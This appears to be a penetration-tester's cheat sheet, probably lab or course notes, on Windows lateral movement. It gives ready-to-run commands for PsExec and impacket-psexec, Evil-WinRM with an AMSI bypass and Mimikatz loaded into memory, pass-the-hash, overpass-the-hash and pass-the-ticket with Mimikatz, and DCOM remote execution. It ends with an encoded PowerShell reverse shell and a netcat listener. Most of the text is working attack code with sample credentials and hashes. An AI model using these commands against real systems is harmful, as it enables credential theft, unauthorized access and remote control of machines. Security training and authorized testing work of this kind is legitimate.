>[!code]- From Windows obtain an interactive shell
>- Launch PsExec64.exe (comes as part of the sysinternalssuite)
>- **\\\\FILES04** to specify what machine to remote to
>- **-u** to specify which user the remote session will be associated with
>- **-p** to specify that user's password
>```powershell
>PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
>```

>[!code]- From Kali obtain an interactive shell with a password
>With a password:
>- Obtain the shell as the user john on machine 10.10.10.1
>```bash
>kali@kali:~$ /usr/bin/impacket-psexec corp.local/john:password123@10.10.10.1
>```
>___
>
>With a hash:
>- Zeros for the LM part of the hash, the other part is the NTLM hash
>```bash
>kali@kali:~$ /usr/bin/impacket-psexec -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
>```
#### Runas

>[!info]- Info - What is runas?
>Runas allows us to run a program as a different user. Runas can be used with local or domain accounts as long as the user has the ability to log on to the system.

>[!code]- Without an interactive shell - might be possible if there are [[Windows#^69aecb|saved credentials]]
^f6fbe8
>[!code]- With an interactive shell - spawn a cmd shell
>- **/user** to specify the username of the user
>  - **cmd** to start cmd shell
>```powershell
PS C:\Users\steve> runas /user:backupadmin cmd  
>```
^62cf05
#### Evil-WinRM

>[!warning]- Limitation - winrm must be enabled on the remote host (default port 5895 and 5896)

>[!code]- Connect to a Windows machine from Kali
>With a clear-text password
>(the backslashes are part of the command):
>```bash
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
>```
>With a NTLM hash:
>```bash
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "32196B56FFE6F45E294117B91A83BF38!"
>```
>Load a script into memory while logging in:
>(Might need to bypass AMSI - more information [here](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)).
>```bash
>evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
>Bypass-4MSI
>Invoke-Mimikatz.ps1
>Invoke-Mimikatz
>```
#### RDP

>[!code]- Using xfreerdp
>```bash
>kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
>```
#### Pass the Hash

>[!code]- Access an SMB share
>```bash
>kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
>```
#### Overpass the hash

>[!info]- Info - What does overpass the hash involve?
>With [_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse an NTLM user hash to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT). Then we can use the TGT to obtain a [_Ticket Granting Service_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS).

>[!exploit]- Exploit - Obtain a TGT using a user's hash

>[!code]- Use Mimikatz to obtain a TGT, then use PsExec to obtain a remote session
>- **/user** to specify the user to obtain a TGT for
>- **/domain** to specify which domain the TGT should be valid for
>- **/ntlm** to specify the NTLM hash of the /user
>- **/run** to specify the process to create (eg. PowerShell)
>```powershell
>mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
>```
>Then run PsExec in the generated PowerShell process:
>```powershell
>PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
>PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
>```
#### Pass the Ticket

>[!exploit]- Exploit - Use a cached TGS to access a service or resource as another user

>[!code]- Obtain a cached TGS in the LSASS memory
>Find and export any tickets:
>```powershell
>mimikatz # privilege::debug
>mimikatz # sekurlsa::tickets /export
>```
>Review the exported tickets:
>```powershell
>PS C:\Tools> dir *.kirbi
>```

>[!code]- Inject a TGS into memory with Mimikatz
>Inject a ticket for dave:
>```powershell
>mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
>```
>Confirm the ticket is in memory:
>```powershell
>PS C:\Tools> klist
>```

>[!code]- Access a domain as the user linked to the injected TGS
>We can now access the backup folder:
>```powershell
>PS C:\Tools> ls \\web04\backup
>```
>Whereas before we couldn't:
>```powershell
>PS C:\Windows\system32> whoami
>corp\jen
>PS C:\Windows\system32> ls \\web04\backup
>ls : Access to the path '\\web04\backup' is denied.
>```
#### DCOM (Distributed Component Object Model)

>[!warning] Requires - Administrator privileges on the local machine.

>[!exploit]- Exploit - Use the Component Object Model to initiate a reverse shell

>[!code]- Initiate a process using the COM
>- **192.168.50.73** is the remote machine
>
Spawn the calculator app on the remote machine:
>```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
>$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
>```
>___
>
>Spawn a reverse shell on the remote machine:
>```powershell
>$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
>```
>Setup a listener on Kali:
>```bash
>kali@kali:~$ nc -lnvp 443
>```







